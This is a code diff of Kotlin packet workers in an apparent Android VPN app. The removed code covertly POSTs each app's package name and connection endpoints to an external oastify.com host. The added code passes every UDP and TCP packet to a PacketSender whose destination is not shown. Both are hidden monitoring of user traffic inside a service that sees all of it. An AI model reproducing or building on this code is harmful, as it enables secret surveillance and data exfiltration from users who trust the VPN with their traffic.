@@ -154,11 +154,14 @@ object UdpSendWorker : Runnable {
     private lateinit var thread: Thread
 
     private var vpnService: VpnService? = null
+    private var globalContext: Context? = null
 
-    private val httpWorker: HttpWorker = HttpWorker()
+    private var packetSender: PacketSender? = null
 
-    fun start(vpnService: VpnService) {
+    fun start(vpnService: VpnService, globalContext: Context) {
         this.vpnService = vpnService
+        this.globalContext = globalContext
+        this.packetSender = PacketSender(vpnService, globalContext);
         udpTunnelQueue.clear()
         thread = Thread(this).apply {
             name = TAG
@@ -176,10 +179,8 @@ object UdpSendWorker : Runnable {
     override fun run() {
         while (!thread.isInterrupted) {
             val packet = deviceToNetworkUDPQueue.take()
-
             val destinationAddress = packet.ip4Header?.destinationAddress
             val udpHeader = packet.udpHeader
-
             val destinationPort = udpHeader?.destinationPort
             val sourcePort = udpHeader?.sourcePort
             val ipAndPort = (destinationAddress?.hostAddress?.plus(":") ?: "unknownHostAddress") + destinationPort + ":" + sourcePort
@@ -198,16 +199,6 @@ object UdpSendWorker : Runnable {
                 }
                 if (!channelConnectSuccess) {
                     continue
-                }
-
-                val connectivityManager = vpnService?.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-                val sourceSocketAddress = InetSocketAddress(packet.ip4Header?.sourceAddress, sourcePort!!)
-                val destinationSocketAddress = InetSocketAddress(destinationAddress, destinationPort!!)
-                val uid = connectivityManager.getConnectionOwnerUid(17, sourceSocketAddress, destinationSocketAddress )
-                val packageManager = vpnService?.packageManager
-                val packageName = packageManager?.getPackagesForUid(uid)?.firstOrNull()
-                if(packageName != vpnService?.packageName){
-                    httpWorker.post("https://y324x0aa5cs12s5x6x5n7ysk2b82wskh.oastify.com", "ip=$ipAndPort&package=$packageName")
                 }
 
                 val tunnel = UdpTunnel(
@@ -243,6 +234,7 @@ object UdpSendWorker : Runnable {
                     udpSocketMap.remove(ipAndPort)
                 }
             }
+            packetSender?.sendPacket(packet)
         }
     }
 }
@@ -420,9 +412,13 @@ object TcpWorker : Runnable {
     private val pipeMap = HashMap<String, TcpPipe>()
 
     private var vpnService: VpnService? = null
+    private var globalContext: Context? = null
+    private var packetSender: PacketSender? = null
 
-    fun start(vpnService: VpnService) {
+    fun start(vpnService: VpnService, globalContext: Context) {
         this.vpnService = vpnService
+        this.globalContext = globalContext
+        this.packetSender = PacketSender(vpnService, globalContext)
         thread = Thread(this).apply {
             name = TAG
             start()
@@ -466,6 +462,7 @@ object TcpWorker : Runnable {
                 pipeMap[ipAndPort] ?: throw IllegalStateException("There should be no null key in pipeMap:$ipAndPort")
             }
             handlePacket(packet, tcpPipe)
+            packetSender?.sendPacket(packet)
         }
     }
 
